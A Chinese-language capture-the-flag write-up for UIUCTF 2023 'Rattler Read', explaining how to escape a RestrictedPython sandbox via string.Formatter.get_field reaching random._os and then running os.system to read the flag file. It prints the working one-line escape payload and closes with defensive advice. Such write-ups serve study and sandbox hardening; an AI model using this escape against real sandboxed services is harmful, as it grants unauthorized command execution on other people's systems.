# UIUCTF 2023 Rattler Read Writeup

## 题目简述

服务用 RestrictedPython 编译并执行一行用户代码。策略禁止导入，并把属性访问、下标和迭代分别交给受限 guard；以下划线开头的属性会被 `safer_getattr` 拦截。

不过执行环境将 RestrictedPython 的 `utility_builtins` 合并进全局变量，其中已经包含 `string`、`random` 和 `math` 模块。目标是利用受信任标准库代码代替受限字节码完成属性访问。

## 解题过程

Python 的 `random` 模块内部执行过：

```python
import os as _os
```

因此 `random._os` 就是 `os` 模块，但在用户表达式里直接写该属性会触发 RestrictedPython 的下划线检查。

`string.Formatter.get_field(field_name, args, kwargs)` 会按照格式字段语法解析对象路径。传入 `"0._os"` 时：

1. `0` 从位置参数列表中取出 `random` 模块；
2. Formatter 自己在标准库内部对它执行 `getattr(random, "_os")`；
3. 这段属性访问不是由用户源码编译产生，因此不会经过 RestrictedPython 插入的 `_getattr_` guard。

`get_field` 返回 `(value, used_key)`，取索引 0 即得到 `os` 模块，随后调用 `system`：

```python
print(string.Formatter().get_field(
    "0._os",
    [random],
    kwargs={},
)[0].system("cat /flag.txt"))
```

远端只接受一行时可压缩为：

```text
print(string.Formatter().get_field("0._os",[random],kwargs={})[0].system("cat /flag.txt"))
```

命令输出：

```text
uiuctf{damn_1_8te_my_ta1l_ag41n}
```

末尾还会打印 `os.system` 的返回码 0，但不影响 flag。

## 方法总结

沙箱不应只审查用户源码中显式出现的危险属性。把功能丰富的模块作为“安全 builtins”暴露后，受信任对象的方法可能形成 confused deputy，在 guard 外替攻击者执行反射操作。本题把 `Formatter.get_field` 的间接 `getattr` 与 `random._os` 拼接成命令执行链。防御上应使用最小化白名单对象，并把不可信代码放到独立进程和系统调用沙箱中，而不是把 RestrictedPython 当作完整安全边界。
